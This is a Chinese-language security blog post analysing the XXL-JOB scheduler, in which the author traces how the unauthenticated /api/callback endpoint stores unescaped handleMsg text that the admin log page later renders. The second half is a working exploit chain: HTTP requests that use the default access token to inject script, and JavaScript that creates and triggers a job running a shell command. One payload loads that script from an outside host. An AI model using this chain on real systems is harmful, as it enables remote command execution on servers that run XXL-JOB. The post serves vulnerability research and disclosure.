---
layout: post
date: 2026-7-0
title: "XXL-JOB/XSS-RCE"
author: "XinYiSleep"
category: Java
---
<h1 id="mWxxc">一.基础信息</h1>

```
XXL-job是一个开源的产品，部署起来还是蛮简单的这里就不讲了。
[https://github.com/xuxueli/xxl-job](https://github.com/xuxueli/xxl-job)
```

<h1 id="mWxssxc">二.漏洞挖掘</h1>

<h2 id="MB93N">2.1：xss挖掘</h2>
```
这套系统使用的拦截器进行权限验证图一XxlSsoWebInterceptor#preHandle，其他的先不看首先我们通过反射拿到对应出
controller的方法@XxlSso这个注解，拿到之后不等于null那参数login内容，空就是true了，51行取反就跳过了。
+ 那么就很明显了存在@XxlSso注解并且login参数是false就放行51行。

```

<!-- 这是一张图片，ocr 内容为：PUBLIC BOOLEAN PREHANDLE(HTTPSERVLETREQUEST REQUEST, HTTPSERVI RESPONSE, OBJECT HANDLER) THROWS EXCEPTIO PONSE 阅读器模式 23 **/ 24 * 1, PARSE REQUEST 25 */ 26 HANDLER METHOD IF (! 27 (!(HANDLER INSTANCEOF HANDLERMETHOD)) { // NOT HANDLERMETHOD, PROCEED WITH THE NEXT INTERCEPTOR 28 29 RETURN TRUE; 30 HANDLERMETHOD METHOD ;(HANDLERMETHOD)HANDLER; 31 32 33 PARSE ANNOTATION 34 XXLSSO METHOD.GETMETHODANNOTATION(XXLSSO.CLASS); XXLSSO 35 BOOLEAN NEEDLOGIN - XXLSSO!-NULL?XXLSSO.LOGIN():TRUE; 36 STRING ERMISSION ; XXLSSO!-NULL?XXLSSO.PERMISSION():NULL; 37 - XXLSSO! NULL?XXLSSO.ROLE():NULL; ROLE 51 38  * 2, VALID EXCLUDED PATH 40 */ 41 12  // VALID EXCLUDED-PATH, PATH 3455  IF (ISMATCHEXCLUDEDPATHS(REQUEST)) { RETURN TRUE; 了 *** 48 * 3, VALID LOGININFO 49 * / NOT NEEDLO 50 JUST PASS 51 (!NEEDLOGIN) 52 RETURN TRUE; 53 -->
![](https://xinyisleep.github.io/img/2026/XXL-JOB/1.png)

```
下面图一就很符合我们的条件是一个可以访问的路由，47行之前都是一些基础判断必须等于post请求，url参数并且存在
内容requestBody也一样，走到
List<CallbackRequest> callbackParamList = GsonTool.fromJson(requestBody, List.class, CallbackRequest.class);
通过 Gson 将 JSON 字符串反序列化为 List<CallbackRequest>，其中 CallbackRequest.class 指定 List 
元素的类型，Gson 按该类的字段结构解析 JSON 中每个对象并赋值,之后走进
return adminBiz.callback(callbackParamList);
会经过callback接着走进去，图二。
```

<!-- 这是一张图片，ocr 内容为：@REQUESTMAPPING(OV"/API/{URIL") 31 &P RESTSERVICES 32 @RESPONSEBODY @XXLSSO(LOGIN FALSE) @NOTNULL HTTPSERVLETREQUEST REQUEST,  PUBLIC OBJECT API( @PATHVARIABLE("URI") STRING URI, 瑞点机数据库 GREQUESTHEADER(VALUE - CONST.XXLJOB-ACCESS,TOKEN, REQUIRED - FALSE) STRING ACCESSTOKEN, 36 @REQUESTBODY(REQUIRED - FALSE) STRING REQUESTBODY) { 38 VALID F (!"POST".EQUALSIGNORECASE(REQUEST.GETMETHOD()))) { IF (! RETURN RESPONSE.OFFAIL( MSG:"INVALID REQUEST, HTTPHETHOD NOT SUPPORT."); CODE LRIS 子 IF (STRINGTOOL.ISBLANK(URI)){ CODEBUDDY RETURN RESPONSE.OFFAIL( MSG:"INVALID REQUEST, URI-MAPPING EMPTY."); IF (STRINGTOOL.ISBLANK(REQUESTBODY)) { RETURN RESPONSE.OFFAIL( MSG:"INVALID REQUEST, REQUESTBODY EMPTY."); 子 VALIDTOKEN IF (STRINGTOOL.ISNOTBLANK(XXLJOBADMINBOOTSTRAP.GETINSTANCE().GETACCESSTOKEN() && !XXLJOBADMINBOOTSTRAP.GETINSTANCE().GETACCESSTOKEN() ( RETURN RESPONSE.OFFAIL(MSG:"THE ACCESS TOKEN IS WRONG."); 56 DISPATCH REQUEST TRY 卡 58 (URI) SWITCH  "CALLBACK": { 59 CASE LISTCCALLBACKRBAUEST) CALLBACKPARANLIST - GSONTOOL,FRONJSONJEONCRERUESTBDY, L3ST,CLASS, GALLAST.GLASS 60 RETURN ADMINBIZ.CALLBACK(CALLBACKPARAMLIST); -->
![](https://xinyisleep.github.io/img/2026/XXL-JOB/2.png)

<!-- 这是一张图片，ocr 内容为：1个用法 PUBLIC RESPONSE<STRING> CALLBACK(LIST<CALLBACKREQUEST> CALLBACKPARAMLIST) 108 CALLBACKTHREADPOOL.EXECUTE(NEW RUNNABLE() { @OVERRIDE  PUBLIC VOID RUN() ( 112 FOR (CALLBACKREQUEST CALLBACKREQUEST: CALLBACKPARAMLIST) { RESPONSE<STRING> CALLBACKRESULT : DOCALLBACK(CALLBACKREQUEST); LOGGER.DEBUG(">>>>>>>>> JOBAPICONTROLLER.CALLBACK F), CALLBACKREQUEST-@, CALLBACKRESULT-@LT-@ (CALLBACKRESULT.ISSUCCESS()?"SUCCESS":"FAILI), CALLBACKREQUEST, CALLBACKRESULT) H);  RETURN RESPONSE.OFSUCCESS(); 120 121 122 -->
![](https://xinyisleep.github.io/img/2026/XXL-JOB/3.png)

```
上图我们得知会循环List<CallbackRequest>进入doCallback方法跟进去看看，下面图一，获取我们传入的
LogId进入load这个其实就到了MyBatis的Mapper接口层了下面代码一,就是查表xxl_job_log，我们传入的LogId查询xxl_job_log
表条件就是t.id = #{id}，这里我们都能控制问题不大，这里有个条件就是log.getHandleCode() ，通过数据库查询的字段
HandleCode需要小于0才能走下去，这个是一个很关键的条件，后面就是append在Setter了，执行到complete进入看看图二，
53行直接就执行sql了代码二,更新了xxl_job_log，现在我们知道的是我们可以控制参数插入进数据库这个xxl-job表很少瞬间
让我想到有没有xss呢？为了验证这个想法，我们就去看看哪里用到了查询Select。

```

<!-- 这是一张图片，ocr 内容为：EST HANDLECALLBACKPARAM) ATE RESPONSE<STRING> DOCALLBACK( @NOTNULL CALLBACKREAUEST HE 123 PRIVATE RES // VALID LOG ITEM 124 XXLJOBLOS LOG - XXLJOBADNINBOOTSTRAP-PETINSTANCE),GETXLJABLOSHAPPERO,LOAD(HAND(HANDLECALLBARAN-GETLOG 125 IF (LOG 三 NULL) { 126 N RESPONSE.OFFAIL( MSG:"LOG ITEM NOT FOUND."); 127 RETURN 中国 128 (LOG.GETHANDLECODE() > 0) { 129 IF (LO RETURN RESPONSE.OFFAIL(MSG:"LOG REPEATE CALLBACK."); // AVOID REPEAT CALLBACK, TRIGGER CHILD JOB ETC 130 131 // HANDLE MSG STRINGBUFFER HANDLEMSG - NEW STRINGBUFFER(); 134  IF (LOG.GETHANDLEMSG()!ENULL) 135 136 HANDLEMSG.APPEND(LOG.GETHANDLEMSG()).APPEND("<BR>"); 137 (HANDLECALLBACKPARAM.GETHANDLEMSG() !: NULL) F IF 138 HANDLEMSG.APPEND(HANDLECALLBACKPARAM.GETHANDLENSG()); 139 子 140 141 142 SUCCESS,SAVE LOG 143 LOG.SETHANDLETIME(NEW DATE()); 144 LOG.SETHANDLECODE(HANDLECALLBACKPARAM.GETHANDLECODE()); 145 LOG.SETHANDLEMSG(HANDLEMSG.TOSTRING(); XXLJOBADMINBOOTSTRAP.GETINSTANCE().GETJOBCOMPLETER().COMPLETE(LOG); 146 147 148 RETURN RESPONSE.OFSUCCESS(); 149 150 -->
![](https://xinyisleep.github.io/img/2026/XXL-JOB/4.png)

<!-- 这是一张图片，ocr 内容为：PUBLIC INT COMPLETE(XXLJOBLOG XXLJOBLOG) 39 40 // 1, PROCESS CHILD-JOB 41 PROCESSCHILDJOB(XXLJOBLOG); 42 43 / TEXT最大64KB 避免长度过长 44 IF (XXLJOBLOG.GETHANDLEMSG().LENGTH() > 15000) - 45 XXLJOBLOG.SETHANDLEMSG( XXLJOBLOG.GETHANDLEMSG( ().SUBSTRING(0, 15000) ); 46 子 47 48  // 2, FIX_DELAY TRIGGER NEXT 49  // ON THE WAY 50 51  // 3,UPDATE JOB HANDLE-INFO 52 RETURN XXLJOBLOGMAPPER.UPDATEHANDLEINFO(XXLJOBLOG); 55 -->
![](https://xinyisleep.github.io/img/2026/XXL-JOB/5.png)

```java
	<select id="load" parameterType="java.lang.Long" resultMap="XxlJobLog">
		SELECT <include refid="Base_Column_List" />
		FROM xxl_job_log AS t
		WHERE t.id = #{id}
	</select>
```

```java
	<update id="updateHandleInfo">
		UPDATE xxl_job_log
		SET 
			`handle_time`= #{handleTime}, 
			`handle_code`= #{handleCode},
			`handle_msg`= #{handleMsg}
		WHERE `id`= #{id}
	</update>
	
	<delete id="delete" >
		delete from xxl_job_log
		WHERE job_id = #{jobId}
	</delete>
```

```
代码一我们直接网上找，发现直接就到Controller了都没有Service层，也省去看逻辑了，图一。

```

```java
	<select id="pageList" resultMap="XxlJobLog">
		SELECT <include refid="Base_Column_List" />
		FROM xxl_job_log AS t
		<trim prefix="WHERE" prefixOverrides="AND | OR" >
			<if test="jobGroup gt 0">
				AND t.job_group = #{jobGroup}
			</if>
			<if test="jobId gt 0">
				AND t.job_id = #{jobId}
			</if>
			<if test="triggerTimeStart != null">
				AND t.trigger_time <![CDATA[ >= ]]> #{triggerTimeStart}
			</if>
			<if test="triggerTimeEnd != null">
				AND t.trigger_time <![CDATA[ <= ]]> #{triggerTimeEnd}
			</if>
			<if test="logStatus == 1" >
				AND t.handle_code = 200
			</if>
			<if test="logStatus == 2" >
				AND (
					t.trigger_code NOT IN (0, 200) OR
					t.handle_code NOT IN (0, 200)
				)
			</if>
			<if test="logStatus == 3" >
				AND t.trigger_code = 200
				AND t.handle_code = 0
			</if>
		</trim>
		ORDER BY t.id DESC
		LIMIT #{offset}, #{pagesize}
	</select>
```

<!-- 这是一张图片，ocr 内容为：@REQUESTMAPPING(O-"/PAGELIST") 112 @RESPANSEBODY 113 PUBLIC RESPONSE<PAGEMODEL<XXLJOBLOGDTO>> PAGELIST(HTTPSERVLETREQUEST REQUEST  "0") INT OFFSET, @REQUESTPARAM(REQUIRED -  FALSE, DEFAULTVALUE FALSE, DEFAULTVALVE - "10") IN  @REQUESTPARAM(REQUIRED : INT PAGESIZE, @REQUESTPARAM AM INT JOBGROUP, @REQUESTPARAM INT JOBID, @REQUESTPARAM INT LOGSTATUS 119 @REQUESTPARAM STRING FILTERTIME) { 120 122 // VALID JOBGROUP PERMISSION 123 JOBGROUPPERMISSIONUTIL.VALIDJOBGROUPPERMISSION(REQUEST, JOBGROUP); 124 // PARSE PARAM 125  DATE TRIGGERTIMESTART ; NULL; 126 127 DATE TRIGGERTIMEEND - NULL; IF (STRINGTOOL.ISNOTBLANK(FILTERTIME)){ 128 "); STRING[] TEMP - FILTERTIME.SPLIT( REGEX: (TEMP.LENGTH 三: 2) TRIGGERTIMESTART - DATETOOL.PARSEDATETIME(TEMP[0]); TRIGGERTIMEEND - DATETOOL.PARSEDATETIME(TEMP[1]); PAQE QUERY LER.PAGELIST(OFFSET, PAGESIZE, JABGROUP. JOBID, TRIGGERTINESTART, TRIGGERTIMEEND, LOGSTATUS); 137 LIST<XXLJOBLOG> LIST - XXLJOBLOGMAPPER.P 139  // MODEL > DTO 140 LIST>XXLJOBLOGDTO> LISTDTO - LIST.STREAM().MAP(XXLJOBLOGDTO::NEW).TOLIST(); 141 142 -->
![](https://xinyisleep.github.io/img/2026/XXL-JOB/6.png)

```
但是这里有个问题就是@ResponseBody注解他直接返回json了，不要慌我在往上看的时候看到了，模板渲染

index方法其中渲染会执行AJAX请求pageList方法，八嘎那么漏洞就形成了。

```

```
那么还记得之前的条件吗？没错需要在任务管理存在一次执行失败的任务，并且请求响应不到就返回的是空这个我觉的基本上都存在失败的对于XXL-JOB这个系统来说，唯独就是load进行遍历就行了反正是存在有序的id。

```

```java
POST /api/callback HTTP/1.1
Host: 192.168.1.153:8888
XXL-JOB-ACCESS-TOKEN: default_token
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 104
Cookie: xxl_job_login_token=ewogICJ1c2VySWQiOiAxLAogICJ1c2VyTmFtZSI6ICJhZG1pbiIsCiAgInJlYWxOYW1lIjogIjEiLAogICJleHRyYUluZm8iOiB7Imxpbmd6dSI6ICJsaW5nenUifSwKICAicm9sZUxpc3QiOiBbImxpbmd6dSIsICJsaW5nenUiXSwKICAicGVybWlzc2lvbkxpc3QiOiBbImxpbmd6dSIsICJsaW5nenUiXSwKICAiZXhwaXJlVGltZSI6IDk5OTk5OTk5OTk5OTksCiAgInNpZ25hdHVyZSI6IDEKfQ==

[{"logId":160,"handleCode":0,"handleMsg":"<script>alert(\"1\")</script>"}]
遍历的话就遍历logId
```

<h2 id="MB94N">2.2：RCE</h2>
```
这里其实就非常简单了，因为在后台的话本身就存在命令执行的功能，唯独就是写一下js的问题了，代码一
```

```java
fetch('/jobinfo/insert', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'jobGroup=2&jobDesc=lingzu&author=lingzu&alarmEmail=&scheduleType=NONE&scheduleConf=&glueType=BEAN&executorHandler=commandJobHandler&executorParam=cmd /c calc&executorRouteStrategy=FIRST&childJobId=&misfireStrategy=DO_NOTHING&executorBlockStrategy=SERIAL_EXECUTION&executorTimeout=0&executorFailRetryCount=0&glueRemark=x&glueSource='
})
.then(r => r.json())
.then(d => {
  if (d.code == 200) {
    fetch('/jobinfo/trigger', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'id=' + d.data + '&executorParam=cmd /c calc&addressList=http://127.0.0.1:9999'
    });
  }
});
```

```java
POST /api/callback HTTP/1.1
Host: 192.168.1.153:8888
XXL-JOB-ACCESS-TOKEN: default_token
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 104
Cookie: xxl_job_login_token=ewogICJ1c2VySWQiOiAxLAogICJ1c2VyTmFtZSI6ICJhZG1pbiIsCiAgInJlYWxOYW1lIjogIjEiLAogICJleHRyYUluZm8iOiB7Imxpbmd6dSI6ICJsaW5nenUifSwKICAicm9sZUxpc3QiOiBbImxpbmd6dSIsICJsaW5nenUiXSwKICAicGVybWlzc2lvbkxpc3QiOiBbImxpbmd6dSIsICJsaW5nenUiXSwKICAiZXhwaXJlVGltZSI6IDk5OTk5OTk5OTk5OTksCiAgInNpZ25hdHVyZSI6IDEKfQ==

[{"logId":	160,"handleCode":0,"handleMsg":"<script src=\"http://127.0.0.1:7575/rce.js\"></script>"}]
```

<!-- 这是一张图片，ocr 内容为：任务调度中心 欢迎: ADMIN 润庆日志 子航 执行器管理 用户管理 8 C用断 页签操作 运行报表 运行服表 全部 任务 搜索 全部 车置 执行器 2026-06-2500:00:00-2026-07-02 23:59:59 调度时间 A执行器SAMPLE 红务管理 X 口 计算出 执行日志 日古清理 G 标准 执行备注 调度结果 调度时间 任务 调度日志ID 无 [18] DEMO 2026-07-02  15:48 162 成功 [17] DEMO 无 成功 2026-07-02  15:01:05 161 0 使用救程 查告 失败 [4] OPENCLA... 2026-07-02 14:57:07 160 MC MS M- MR MY M+ 10条记录 总共3条记录每页显示 % CE X2 7 8 9 X 5 4 6 2 3 0 /4 -->
![](https://xinyisleep.github.io/img/2026/XXL-JOB/7.png)

